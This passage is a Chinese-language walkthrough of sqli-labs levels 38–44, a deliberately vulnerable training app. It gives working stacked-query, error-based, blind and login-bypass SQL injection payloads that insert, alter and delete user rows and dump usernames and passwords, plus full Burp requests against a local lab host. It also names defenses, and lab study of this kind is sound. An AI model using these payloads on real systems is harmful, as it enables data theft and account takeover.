![1791012068614-624cb20f-a41d-4504-a5ba-a8318b70d12e.png](./img/285943702/1791012068614-624cb20f-a41d-4504-a5ba-a8318b70d12e-180053.png)

**6）关于 **`sleep`** 等**

多语句时，页面往往只处理**第一个结果集**；后面的 `SELECT sleep(5)` 可能已执行但前端无感。验证堆叠优先用 **INSERT/建表** 等有持久副作用的操作，而不是只看延时。

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 前提 | 驱动/API 允许多语句（此处为 `mysqli_multi_query`） |
| 语法 | `';` 结束当前语句，后面写下一条 |
| 闭合 | 先 `'` 闭合原字符串，再 `;` |
| 危害 | 可写、可删、可改结构，远超“只读联合” |
| 防御 | 禁用多语句；参数化；最小权限账号 |

***

### Less-39：GET · 堆叠注入 · 整型（无引号）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-39/?id=1` |
| 注入方式 | GET |
| 类型 | **数字型** + 堆叠注入 |
| 关键 API | `mysqli_multi_query()`（支持多语句） |
| 典型 SQL 形态 | `SELECT * FROM users WHERE id=$id LIMIT 0,1`（`$id` **无引号**） |
| 与 Less-38 差异 | 38 为单引号字符型；39 **不需要**用 `'` 闭合，直接写 `;` 后的第二条语句 |

#### 源码逻辑（理解用）

```latex
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
mysqli_multi_query($con, $sql);
```

整型条件下，输入 `1; insert ...` 会拼成：

```sql
SELECT * FROM users WHERE id=1; insert ... LIMIT 0,1
```

第二条语句后的 `LIMIT` 可用 `--+` / `#` 注释掉。

#### 解题步骤

**1）确认数字型**

```latex
?id=1
?id=1'
?id=1 and 1=1
?id=1 and 1=2
```

无需引号即可改变逻辑 → 整型。

![1791012601211-dbf7488b-14ab-4243-abb4-87239043083a.png](./img/285943702/1791012601211-dbf7488b-14ab-4243-abb4-87239043083a-974319.png)

![1791012612008-2ba25280-9db8-4373-ac45-c2a533f0cadd.png](./img/285943702/1791012612008-2ba25280-9db8-4373-ac45-c2a533f0cadd-079396.png)

**2）确认堆叠可用**

```latex
?id=1; insert into users(id,username,password) values(39,'less39','less39')--+
```

插入后查询验证：

```latex
?id=-1 union select 1,username,password from users where username='less39'--+
```

或：

```latex
?id=39
```

能看到新用户 → 堆叠成功。

![1791012663869-09914044-426b-41ca-b688-0487cf0eb87a.png](./img/285943702/1791012663869-09914044-426b-41ca-b688-0487cf0eb87a-512047.png)

![1791012850205-665097b7-3c22-4f1f-8d12-e31735e11756.png](./img/285943702/1791012850205-665097b7-3c22-4f1f-8d12-e31735e11756-525495.png)

![1791012862527-117b3dca-f9dc-4354-9d00-5161e49e4c0e.png](./img/285943702/1791012862527-117b3dca-f9dc-4354-9d00-5161e49e4c0e-568890.png)

**3）建表演示**

```latex
?id=1; create table less39_copy like users--+
```

```latex
?id=1; insert into less39_copy select * from users--+

?id=-1 union select 1,group_concat(username,0x3a,password),3 from less39_copy --+
```

![1791012927107-c87a5ebd-05f7-46cb-802b-2f69a10afd79.png](./img/285943702/1791012927107-c87a5ebd-05f7-46cb-802b-2f69a10afd79-858103.png)

![1791012946436-815fd1fb-d71b-4b1d-be90-7aa9a518fadf.png](./img/285943702/1791012946436-815fd1fb-d71b-4b1d-be90-7aa9a518fadf-721696.png)

![1791013074809-d4366f95-4328-4f4b-92b9-5d1682536a95.png](./img/285943702/1791013074809-d4366f95-4328-4f4b-92b9-5d1682536a95-756799.png)

**4）联合取数（可选）**

```latex
?id=-1 union select 1,database(),3--+
?id=-1 union select 1,group_concat(username,0x3a,password),3 from users--+
```

列数以本地 `order by` 为准。

![1791013131108-5a1155e9-7d21-4c5d-b2bb-119bc7d72722.png](./img/285943702/1791013131108-5a1155e9-7d21-4c5d-b2bb-119bc7d72722-731514.png)

![1791013170777-a83ea1aa-1adc-447c-b663-5e5094b9fa2a.png](./img/285943702/1791013170777-a83ea1aa-1adc-447c-b663-5e5094b9fa2a-173915.png)

**5）其它堆叠示例（仅限靶场）**

```latex
?id=1; update users set password='p39' where username='less39'--+
?id=1; delete from users where username='less39'--+
```

练习后可用首页 **Setup/resetDB** 恢复。

![1791013550895-affc307b-1f51-464c-bc9b-cb5e9f678e8f.png](./img/285943702/1791013550895-affc307b-1f51-464c-bc9b-cb5e9f678e8f-227405.png)

![1791013585526-d4bef236-4ab2-48fe-b890-d402c943ed30.png](./img/285943702/1791013585526-d4bef236-4ab2-48fe-b890-d402c943ed30-171271.png)

![1791013624337-cb271dc2-661c-4770-aa74-6500519c36c0.png](./img/285943702/1791013624337-cb271dc2-661c-4770-aa74-6500519c36c0-330727.png)

![1791013638947-106a1b65-404d-4064-ac13-dd60c41e965b.png](./img/285943702/1791013638947-106a1b65-404d-4064-ac13-dd60c41e965b-294421.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 闭合 | 无引号，直接 `数字; 下一条SQL` |
| 注释 | `--+` 或 `#` 去掉原语句尾巴 |
| 与 38 | 同为堆叠，本关是整型写法 |
| 验证 | 优先 INSERT/建表，不单靠 sleep |

***

### Less-40：GET · 堆叠注入 · 单引号 + 括号 `')`

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-40/?id=1` |
| 注入方式 | GET |
| 类型 | 字符型 + 堆叠注入 |
| 闭合方式 | `')` |
| 关键 API | `mysqli_multi_query()` |
| 典型 SQL 形态 | `SELECT * FROM users WHERE id=('$id') LIMIT 0,1` |
| 与 Less-38 差异 | 多一层括号，闭合从 `'` 变为 `')` |

#### 源码逻辑（理解用）

```latex
$sql = "SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
mysqli_multi_query($con, $sql);
```

注入时需先用 `')` 结束字符串和括号，再写 `;` 启动第二条语句，最后注释掉后面的 `LIMIT` 等。

拼出效果类似：

```sql
SELECT * FROM users WHERE id=('1'); insert into users ... -- ') LIMIT 0,1
```

#### 解题步骤

**1）确认闭合**

```latex
?id=1'
?id=1')
?id=1')--+
```

`1')--+` 正常 → 闭合为 `')`。

![1791020498723-fff86273-96c1-497e-aa93-5ad13143f4ca.png](./img/285943702/1791020498723-fff86273-96c1-497e-aa93-5ad13143f4ca-801808.png)

![1791020512278-972314b0-07d7-4506-b63c-a603fd284728.png](./img/285943702/1791020512278-972314b0-07d7-4506-b63c-a603fd284728-424295.png)

**2）堆叠插入**

```latex
?id=1'); insert into users(id,username,password) values(40,'less40','less40')--+
```

验证：

```latex
?id=-1') union select 1,username,password from users where username='less40'--+
```

或浏览能显示 `less40` 的查询方式。

![1791020552709-914086bd-46e3-4882-b7f3-8ff6a65f8907.png](./img/285943702/1791020552709-914086bd-46e3-4882-b7f3-8ff6a65f8907-141050.png)

![1791020724546-331f40ed-dd03-485e-ae52-5584c7821b41.png](./img/285943702/1791020724546-331f40ed-dd03-485e-ae52-5584c7821b41-034727.png)

**3）建表 / 拷贝数据**

```latex
?id=1'); create table less40_copy like users--+
```

```latex
?id=1'); insert into less40_copy select * from users--+
```

![1791020770263-179bf246-01bf-49e1-b471-59c1a81e18cc.png](./img/285943702/1791020770263-179bf246-01bf-49e1-b471-59c1a81e18cc-126972.png)

![1791020797465-77667cda-6dc0-486b-bab0-7c1db3adc9ca.png](./img/285943702/1791020797465-77667cda-6dc0-486b-bab0-7c1db3adc9ca-471943.png)

![1791020840842-0b84086b-516f-413c-8d5e-cd3d59f238eb.png](./img/285943702/1791020840842-0b84086b-516f-413c-8d5e-cd3d59f238eb-150953.png)

**4）联合取数**

```latex
?id=-1') union select 1,database(),3--+
```

```latex
?id=-1') union select 1,group_concat(username,0x3a,password),3 from users--+
```

列数本地实测。

![1791020911202-f58422f6-0ec6-4747-bc94-c3cbe8a79056.png](./img/285943702/1791020911202-f58422f6-0ec6-4747-bc94-c3cbe8a79056-954655.png)

![1791020951824-537bf8e6-4c4a-4585-a031-ee531cb9e109.png](./img/285943702/1791020951824-537bf8e6-4c4a-4585-a031-ee531cb9e109-971910.png)

**5）与 38、39 对照**

| 关卡 | 类型 | 堆叠 payload 开头形态 |
| --- | --- | --- |
| 38 | 字符 `'` | `1'; insert ...--+` |
| 39 | 整型 | `1; insert ...--+` |
| 40 | 字符 `')` | `1'); insert ...--+` |

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 闭合 | 必须 `')`，只写 `'` 不够 |
| 堆叠 | `');` 后接下一条完整 SQL |
| 注释 | `--+` / `#` 处理原语句剩余部分 |
| 防御 | 禁用 multi_query；参数化；最小权限 |

***

### Less-41：GET · 堆叠注入 · 整型 · 弱报错 / 盲注倾向

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-41/?id=1` |
| 注入方式 | GET |
| 类型 | **数字型** + 堆叠注入 |
| 关键 API | `mysqli_multi_query()` |
| 回显特点 | 常**不输出详细 SQL 报错**；联合/报错不一定直观，堆叠用「写库」验证更稳 |
| 典型 SQL 形态 | `SELECT * FROM users WHERE id=$id LIMIT 0,1` |
| 与 Less-39 关系 | 同为整型堆叠；41 更强调无报错、靠副作用确认 |

#### 源码逻辑（理解用）

```latex
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
mysqli_multi_query($con, $sql);
```

无引号，可直接：

```sql
... WHERE id=1; insert into users ... -- 
```

页面可能只展示第一条 SELECT 的结果，后面语句是否执行要用**数据是否被改**来判断。

#### 解题步骤

**1）确认数字型**

```latex
?id=1
?id=1 and 1=1
?id=1 and 1=2
```

真假页有差异（有/无用户信息），且不必依赖 `'` 闭合。

![1791021763042-6205a173-e4e9-4fb9-8a33-10a7fc777848.png](./img/285943702/1791021763042-6205a173-e4e9-4fb9-8a33-10a7fc777848-298354.png)

![1791021781580-d3638f50-1cc9-4be5-a264-20102440d809.png](./img/285943702/1791021781580-d3638f50-1cc9-4be5-a264-20102440d809-812015.png)

**2）确认堆叠（插入验证）**

```latex
?id=1; insert into users(id,username,password) values(41,'less41','less41')--+
```

验证方式任选其一：

```latex
?id=-1 union select 1,username,password from users where username='less41'--+
```

```latex
?id=41
```

能看到 `less41` → 堆叠成功。\
（若联合无回显，可在库中直接查，或换一个已知会回显的查询方式。）

![1791022027736-24aaa664-4866-4331-af70-14d7e979eb86.png](./img/285943702/1791022027736-24aaa664-4866-4331-af70-14d7e979eb86-451855.png)

![1791022079135-04c83266-6722-48e6-952a-f15e73c3454d.png](./img/285943702/1791022079135-04c83266-6722-48e6-952a-f15e73c3454d-516127.png)

**3）建表演示**

```latex
?id=1; create table less41_copy like users--+
?id=1; insert into less41_copy select * from users--+
```

![1791022119729-c7711d3e-d98e-4b06-8499-f8ba0068eac6.png](./img/285943702/1791022119729-c7711d3e-d98e-4b06-8499-f8ba0068eac6-364349.png)

![1791022147244-53ea8e88-0adc-49e9-b6b9-655be3862a87.png](./img/285943702/1791022147244-53ea8e88-0adc-49e9-b6b9-655be3862a87-550739.png)

![1791022175015-2e18ec8f-65ec-4a89-a8f7-1913985090d9.png](./img/285943702/1791022175015-2e18ec8f-65ec-4a89-a8f7-1913985090d9-156516.png)

**4）联合取数（若有回显位）**

```latex
?id=-1 union select 1,database(),3--+
?id=-1 union select 1,group_concat(username,0x3a,password),3 from users--+
```

列数以本地为准。无回显时改用盲注或只练堆叠写操作。

![1791022299231-70742150-d2ca-4099-b4f2-f29e1764f29c.png](./img/285943702/1791022299231-70742150-d2ca-4099-b4f2-f29e1764f29c-916093.png)

![1791022371042-7bd268a2-83a6-4d33-9182-0a3059245b87.png](./img/285943702/1791022371042-7bd268a2-83a6-4d33-9182-0a3059245b87-714958.png)

**5）关于 sleep**

多语句时前端往往只处理第一个结果集，`sleep` 可能已执行但页面无感。**不要用“没延时”否定堆叠**；以 INSERT/UPDATE 是否生效为准。

**6）其它堆叠（仅限靶场）**

```latex
?id=1; update users set password='p41' where username='less41'--+
?id=1; delete from users where username='less41'--+
```

之后可用首页 **Setup/resetDB** 恢复。

![1791022462942-2297e993-bbeb-4d9a-b823-55999fc49240.png](./img/285943702/1791022462942-2297e993-bbeb-4d9a-b823-55999fc49240-676901.png)

![1791022651946-baa25c50-4c6a-45f0-99d6-1a70b3096058.png](./img/285943702/1791022651946-baa25c50-4c6a-45f0-99d6-1a70b3096058-020138.png)

![1791022694553-30ea2d74-6a2e-41e1-bc7b-92be90055212.png](./img/285943702/1791022694553-30ea2d74-6a2e-41e1-bc7b-92be90055212-684928.png)

![1791022682030-f3b347a7-9ec4-49bf-a10f-0e1845dee685.png](./img/285943702/1791022682030-f3b347a7-9ec4-49bf-a10f-0e1845dee685-216211.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 形态 | `?id=1; 第二条SQL--+` |
| 验证 | 写库副作用，不单靠报错或 sleep |
| 与 39 | 同为整型堆叠，41 回显更弱 |

***

### Less-42：POST · 登录框 · 密码点注入 · 报错 + 堆叠

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-42/`（登录页，参数名常见 `login_user`、`login_password`） |
| 注入方式 | **POST** |
| 注入点 | `login_password`**（密码）**；用户名常被 `mysqli_real_escape_string` 处理 |
| 类型 | 字符型（单引号） |
| 能力 | 有报错回显；支持 `mysqli_multi_query`\*\* 堆叠\*\* |
| 典型 SQL 形态 | `SELECT * FROM users WHERE username='$username' and password='$password'` |

#### 源码逻辑（理解用）

```latex
$username = mysqli_real_escape_string($con, $_POST["login_user"]);
$password = $_POST["login_password"];   // 未转义
$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
mysqli_multi_query($con, $sql);
```

* 用户名被转义，难注入。
* **密码未转义**，可闭合 `'` 后联合、报错或 `;` 堆叠。
* 与「二次注入改密」不同：本关直接在**登录查询**的密码条件上动手。

#### 解题步骤

**1）定位注入点**

用户名填 `admin`，密码填：

```latex
1'
```

若出现 SQL 语法错误 → 密码进了 SQL。\
用户名填 `admin'` 往往无同样效果（被转义）。

![1791023143611-38a3782f-007c-466a-965d-240a55922d10.png](./img/285943702/1791023143611-38a3782f-007c-466a-965d-240a55922d10-293161.png)

**2）报错注入读库名**

密码框（或 Burp 改 `login_password`）：

```latex
1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)#
```

```latex
1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#

1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)#
```

```latex
1' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)#
```

用户名可随意（如 `admin` 或 `a`）。

![1791023342922-e803b11c-102c-453a-8f64-b7f5d79c0679.png](./img/285943702/1791023342922-e803b11c-102c-453a-8f64-b7f5d79c0679-324941.png)

![1791023499521-e994a7d3-b77e-4719-ba02-8b3129cd9119.png](./img/285943702/1791023499521-e994a7d3-b77e-4719-ba02-8b3129cd9119-406263.png)

![1791023575763-b98a0b60-a315-4f88-a842-39c266c30a85.png](./img/285943702/1791023575763-b98a0b60-a315-4f88-a842-39c266c30a85-961793.png)

**3）绕过登录（可选）**

```latex
login_user=admin
login_password=1' or '1'='1'#
```

或：

```latex
login_password=1' or 1=1#
```

![1791023824907-b8818976-a732-4851-9fc8-d935dff1b115.png](./img/285943702/1791023824907-b8818976-a732-4851-9fc8-d935dff1b115-544616.png)

**4）堆叠注入：插入用户**

```latex
login_user=admin
login_password=1'; insert into users(id,username,password) values(42,'post42','post42')#

1' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username='post42'),0x7e),1)#
```

登录提交后，用已知账号查询或报错/联合验证 `post42` 是否存在。

![1791025809175-a54e8cca-9fb4-49ed-9a1a-7ba2942dc682.png](./img/285943702/1791025809175-a54e8cca-9fb4-49ed-9a1a-7ba2942dc682-389048.png)

![1791029312429-c095b943-8dda-4f20-982f-9e4dd2da6bb2.png](./img/285943702/1791029312429-c095b943-8dda-4f20-982f-9e4dd2da6bb2-755863.png)

**5）堆叠：改密码 / 删用户（仅限靶场）**

```latex
1'; update users set password='hacked42' where username='admin'#
```

```latex
1'; delete from users where username='post42'#
```

![1791029437518-868c069d-aef6-47be-bc8e-0b8b214c3ef4.png](./img/285943702/1791029437518-868c069d-aef6-47be-bc8e-0b8b214c3ef4-505168.png)

![1791029505744-e8cfe9e9-8a7b-4d6a-8ace-d61c5d800e2e.png](./img/285943702/1791029505744-e8cfe9e9-8a7b-4d6a-8ace-d61c5d800e2e-463879.png)

![1791029552314-306991af-5dbb-4dea-8ea5-1f5829e83cee.png](./img/285943702/1791029552314-306991af-5dbb-4dea-8ea5-1f5829e83cee-084427.png)

**6）Burp 示例**

```http
POST http://192.168.3.3/sqli-labs/Less-42/login.php HTTP/1.1
Host: 192.168.3.3
Content-Length: 120
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Origin: http://192.168.3.3
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.3.3/sqli-labs/Less-42/
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=0kd5tefprpojvrv28cos2uvp56
Connection: close

login_user=admin&login_password=1'; insert into users(id,username,password) values(42,'post42','post42')#&mysubmit=Login
```

（具体参数名以页面表单为准，可能是 `mysubmit=Login`。）

![1791030635176-9afa5522-3622-48ab-adde-fe36045b75db.png](./img/285943702/1791030635176-9afa5522-3622-48ab-adde-fe36045b75db-408234.png)

![1791030649627-2b81cf85-d0b3-4b67-9af7-66597d07f008.png](./img/285943702/1791030649627-2b81cf85-d0b3-4b67-9af7-66597d07f008-314068.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 注入点 | 密码字段，不是用户名 |
| 闭合 | 单引号 `'` |
| 读数据 | 报错 `updatexml` / `extractvalue` 很顺手 |
| 写操作 | `';` 堆叠 INSERT/UPDATE/DELETE |
| 与 38～41 | 堆叠思想相同，本关改为 **POST 登录** |

***

### Less-43：POST · 密码点注入 · 报错 + 堆叠 · 闭合 `')`

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-43/` |
| 注入方式 | POST（登录框） |
| 注入点 | `login_password`**（密码）**；用户名常被 `mysqli_real_escape_string` 转义 |
| 类型 | 字符型 |
| 闭合方式 | `')`（单引号 + 右括号） |
| 能力 | 有报错回显；支持 `mysqli_multi_query` 堆叠 |
| 典型 SQL 形态 | `... WHERE username=('$username') and password=('$password')` |
| 与 Less-42 差异 | 仅闭合从 `'` 变为 `')`，注入点与手法相同 |

#### 源码逻辑（理解用）

```latex
$username = mysqli_real_escape_string($con, $_POST["login_user"]);
$password = $_POST["login_password"];
$sql = "SELECT * FROM users WHERE username=('$username') and password=('$password')";
mysqli_multi_query($con, $sql);
```

密码未转义，但落在 `('$password')` 中，需用 `')` 正确闭合后再报错或堆叠。

#### 解题步骤

**1）确认注入点与闭合**

用户名：`admin`（或任意）\
密码依次试：

```latex
1'
1')
1')#
```

* `1'` 报错且 near 信息含括号 → 倾向 `')`
* `1') or 1=1#` 能登录成功，而 `1') and 1=1#` 失败 → 闭合为 `')`

![1791084223338-0cd6b8cb-db14-41cd-930c-f4a84e3223c5.png](./img/285943702/1791084223338-0cd6b8cb-db14-41cd-930c-f4a84e3223c5-545438.png)

![1791084239666-a2176b85-277d-4b7d-b860-5c73abfafe46.png](./img/285943702/1791084239666-a2176b85-277d-4b7d-b860-5c73abfafe46-428439.png)

![1791084254684-d5776b33-6d82-4f01-9e6f-05dd455cf64e.png](./img/285943702/1791084254684-d5776b33-6d82-4f01-9e6f-05dd455cf64e-355523.png)

![1791084276120-fed5b930-4050-45cb-8429-a5ef2717928f.png](./img/285943702/1791084276120-fed5b930-4050-45cb-8429-a5ef2717928f-024507.png)

![1791084293223-dd2fdebf-045d-4699-aadd-419eea373476.png](./img/285943702/1791084293223-dd2fdebf-045d-4699-aadd-419eea373476-383360.png)

**2）报错注入读数据**

密码框：

```latex
1') and updatexml(1,concat(0x7e,(select database()),0x7e),1)#
```

```latex
1') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#

1') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)#
```

```latex
1') and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)#
```

![1791085551153-a2ef7194-58fa-44c2-a1c8-3d00d6ac2fc2.png](./img/285943702/1791085551153-a2ef7194-58fa-44c2-a1c8-3d00d6ac2fc2-710990.png)

![1791085676507-825e2498-7a7d-4b65-8aa8-e1aec54569d7.png](./img/285943702/1791085676507-825e2498-7a7d-4b65-8aa8-e1aec54569d7-306678.png)

![1791085761634-526659d6-6f0a-4bd4-9712-79cedb444980.png](./img/285943702/1791085761634-526659d6-6f0a-4bd4-9712-79cedb444980-834064.png)

**3）堆叠：插入用户**

```latex
1'); insert into users(id,username,password) values(43,'less43','less43')#

1') and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username='less43'),0x7e),1)#
```

之后用 `less43` / `less43` 尝试登录验证。

![1791085827252-f9ff10bf-6074-438c-8277-d49ae0d0e1fd.png](./img/285943702/1791085827252-f9ff10bf-6074-438c-8277-d49ae0d0e1fd-483233.png)

![1791086019079-10f3d04f-c460-4c81-9cdb-dedd9aa0bf15.png](./img/285943702/1791086019079-10f3d04f-c460-4c81-9cdb-dedd9aa0bf15-277416.png)

**4）堆叠：改密 / 删除（仅限靶场）**

```latex
1'); update users set password='stacked43' where username='admin'#
```

```latex
1'); delete from users where username='less43'#
```

![1791086097645-146d1ca6-77e1-4b34-a4e8-d3d20b4a3a4a.png](./img/285943702/1791086097645-146d1ca6-77e1-4b34-a4e8-d3d20b4a3a4a-701168.png)

![1791086113375-9da076f2-3922-45cc-b613-295afcdc721b.png](./img/285943702/1791086113375-9da076f2-3922-45cc-b613-295afcdc721b-318853.png)

![1791086183159-bdd010b1-dc01-4a55-83f0-b3fd2496881d.png](./img/285943702/1791086183159-bdd010b1-dc01-4a55-83f0-b3fd2496881d-143144.png)

![1791086195522-b437352b-3679-46cb-8408-ce18235d5f19.png](./img/285943702/1791086195522-b437352b-3679-46cb-8408-ce18235d5f19-658616.png)

**5）Burp 示例**

```http
POST http://192.168.3.3/sqli-labs/Less-43/login.php HTTP/1.1
Host: 192.168.3.3
Content-Length: 121
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Origin: http://192.168.3.3
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.3.3/sqli-labs/Less-43/
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=0kd5tefprpojvrv28cos2uvp56
Connection: close

login_user=admin&login_password=1'); insert into users(id,username,password) values(43,'less43','less43')#&mysubmit=Login
```

（参数名以实际表单为准。）

![1791086386955-ab3a3bfb-c0c9-4a20-b782-1d7735a4f1fc.png](./img/285943702/1791086386955-ab3a3bfb-c0c9-4a20-b782-1d7735a4f1fc-680927.png)

![1791086400525-ce81f294-cd98-4cbc-ad35-21daf35c7f01.png](./img/285943702/1791086400525-ce81f294-cd98-4cbc-ad35-21daf35c7f01-390572.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 注入点 | 密码，不是用户名 |
| 闭合 | `')`，只写 `'` 不够 |
| 堆叠 | `');` 后接下一条 SQL |
| 与 42 | 同结构，多一层括号 |

***

### Less-44：POST · 密码点 · 单引号 · 盲注倾向 + 堆叠

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-44/` |
| 注入方式 | POST（登录框） |
| 注入点 | **密码**（用户名仍可能被转义） |
| 类型 | 字符型，闭合 `'` |
| 回显特点 | 往往**无详细 SQL 报错**；通过登录成功/失败做布尔判断，或时间盲注；仍支持堆叠 |
| 典型 SQL 形态 | `... WHERE username='$username' and password='$password'` |
| 与 Less-42 差异 | 闭合同为 `'`，但弱报错，读数据更依赖盲注；堆叠写操作依然有效 |

#### 源码逻辑（理解用）

与 42 类似：密码未充分转义并可注入；`mysqli_multi_query` 允许多语句。区别主要在应用层**不把 mysql_error 打到页面**，因此 `updatexml` 可能看不到 XPATH 报错，需换思路。

#### 解题步骤

**1）确认注入与闭合**

密码试：

```latex
1'
1' or 1=1#
1' and 1=2#
```

* `1' or 1=1#` 登录成功、`1' and 1=2#` 失败 → 单引号字符型布尔盲注成立。

![1791086783674-ffb90c84-737e-45bb-8f9f-635aa7ba8314.png](./img/285943702/1791086783674-ffb90c84-737e-45bb-8f9f-635aa7ba8314-400546.png)

![1791086812548-0be49538-3263-492c-899d-f921ce3eb91e.png](./img/285943702/1791086812548-0be49538-3263-492c-899d-f921ce3eb91e-504815.png)

**2）布尔盲注猜库名**

```latex
1' or 1=1 and length(database())=8#
1' or 1=1 and substr(database(),1,1)='s'#
1' or 1=1 and ascii(substr(database(),1,1))=115#
```

以登录成功/失败为真假。

![1791087104042-8b4c5288-6c5c-4d09-862c-4b13ee85e8c2.png](./img/285943702/1791087104042-8b4c5288-6c5c-4d09-862c-4b13ee85e8c2-114059.png)

![1791087205841-1a0f1db4-3681-4140-b0f9-4928b1803ec2.png](./img/285943702/1791087205841-1a0f1db4-3681-4140-b0f9-4928b1803ec2-797988.png)

![1791087253715-e920051a-79c7-4708-b52f-bf423159d4d9.png](./img/285943702/1791087253715-e920051a-79c7-4708-b52f-bf423159d4d9-264886.png)

**3）时间盲注备选**

```latex
1' or 1=1 and if(length(database())=8,sleep(5),0)#
1' or 1=1 and if(substr(database(),1,1)='s',sleep(5),0)#
```

注意：堆叠/多结果集时延时体验可能不稳定，布尔更优先。

![1791087468870-08d05991-d019-44e8-ab01-a5c68f3bbb1c.png](./img/285943702/1791087468870-08d05991-d019-44e8-ab01-a5c68f3bbb1c-774668.png)

**4）堆叠写库（不依赖报错回显）**

```latex
1' or 1=1; insert into users(id,username,password) values(44,'less44','less44')#
```

```latex
1' or 1=1; update users set password='p44' where username='admin'#

1' or 1=1; delete from users where username='less44'#
```

用新账号登录或再查库验证。堆叠是否成功看**数据变化**，不看错误页。

![1791087666273-2f073aaf-29df-4592-9a39-4cf8d784e098.png](./img/285943702/1791087666273-2f073aaf-29df-4592-9a39-4cf8d784e098-408064.png)

![1791087689723-9cb63451-f38e-41d0-8f9c-1fbb494b18b2.png](./img/285943702/1791087689723-9cb63451-f38e-41d0-8f9c-1fbb494b18b2-739609.png)

![1791087818766-67b3051d-f5fe-42d4-92b4-2f4851d1d1bb.png](./img/285943702/1791087818766-67b3051d-f5fe-42d4-92b4-2f4851d1d1bb-497623.png)

![1791087833964-ca50f851-11c5-4f42-88c6-44b4b8383e37.png](./img/285943702/1791087833964-ca50f851-11c5-4f42-88c6-44b4b8383e37-005827.png)

**5）若偶然有联合回显**

```latex
-1' union select 1,database(),3#

-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#

-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'#

-1' union select 1,group_concat(username,0x3a,password),3 from users#
```

多数 44 环境以盲注 + 堆叠为主，不必强求联合。

![1791087892155-666673c4-b0a9-430e-86ad-5d2f00e728bf.png](./img/285943702/1791087892155-666673c4-b0a9-430e-86ad-5d2f00e728bf-834107.png)

![1791088002163-d0c2215f-5e01-4a68-98d8-e9b90c03a6d0.png](./img/285943702/1791088002163-d0c2215f-5e01-4a68-98d8-e9b90c03a6d0-848029.png)

![1791088033523-15bc9aad-c78b-49e0-a725-5552b2ba6772.png](./img/285943702/1791088033523-15bc9aad-c78b-49e0-a725-5552b2ba6772-053210.png)

![1791088105173-b25f11fd-0d44-47b5-a47c-b41e51d28d38.png](./img/285943702/1791088105173-b25f11fd-0d44-47b5-a47c-b41e51d28d38-893935.png)

**6）Burp 示例**

```http
POST http://192.168.3.3/sqli-labs/Less-44/login.php HTTP/1.1
Host: 192.168.3.3
Content-Length: 127
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Origin: http://192.168.3.3
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.3.3/sqli-labs/Less-44/
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=0kd5tefprpojvrv28cos2uvp56
Connection: close

login_user=admin&login_password=1' or 1=1; insert into users(id,username,password) values(44,'less44','less44')#&mysubmit=Login
```

![1791088409485-3e0b14a1-90f9-4645-8bec-442cec53a1c5.png](./img/285943702/1791088409485-3e0b14a1-90f9-4645-8bec-442cec53a1c5-941275.png)

![1791088421330-28d60e35-c33d-4a8a-8363-039a1384d664.png](./img/285943702/1791088421330-28d60e35-c33d-4a8a-8363-039a1384d664-422117.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 闭合 | `'` |
| 读数据 | 布尔/时间盲注（无报错时） |
| 写操作 | `';` 堆叠，用登录结果或库内容验证 |
| 与 42/43 | 42 有报错+`'`；43 有报错+`')`；44 弱回显+`'` |

***

